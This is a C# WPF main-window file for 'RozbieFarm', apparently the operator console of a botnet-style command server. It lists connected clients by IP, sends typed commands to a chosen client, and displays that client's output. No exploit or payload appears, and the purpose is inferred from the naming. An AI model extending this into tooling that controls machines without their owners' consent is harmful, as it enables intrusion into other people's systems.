using RozbieFarm.Model;
using RozbieFarm.RozbieServer;
using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;

namespace RozbieFarm
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private readonly ObservableCollection<RozbieInfo> _clients = new();
        private readonly RozbieTextResponse _info = new();

        public MainWindow()
        {
            InitializeComponent();
            InitData();
        }

        private void InitData()
        {
            Clients.ItemsSource = _clients;
            InfoTextBlock.DataContext = _info;
            _ = Task.Run(async () => { await Server.RunServerAsync(_clients, this); });
        }

        public void SetInfo(string txt)
        {
            _info.Txt = txt;
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            Server.StopServer();
        }

        private RozbieTask? FindRozbieByRozbieInfo(RozbieInfo info)
        {
            foreach (var cl in _clients)
            {
                if (cl.IP == info.IP)
                {
                    var task = Server.Tasks.Where(p => p.IP.Equals(cl.IP));
                    if (task.Any())
                    {
                        return task.First();
                    }
                    break;
                }
            }

            return null;
        }

        private async void Button_Click(object sender, RoutedEventArgs e)
        {
            var cmd = Cmd.Text;
            if(cmd.Length > 0)
            {
                var item = Clients.SelectedItem as RozbieInfo;
                if (item != null)
                {
                    var rozbie = FindRozbieByRozbieInfo(item);
                    if (rozbie != null)
                    {
                        await rozbie.SendClientAsync(cmd);
                        Cmd.Text = string.Empty;
                    }
                }
            }
        }

        private void Clients_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var item = Clients.SelectedItem as RozbieInfo;
            if (item != null)
            {
                var rozbie = FindRozbieByRozbieInfo(item);
                if (rozbie != null)
                {
                    _info.Txt = rozbie.GetBuffer;
                }
            }
        }
    }
}
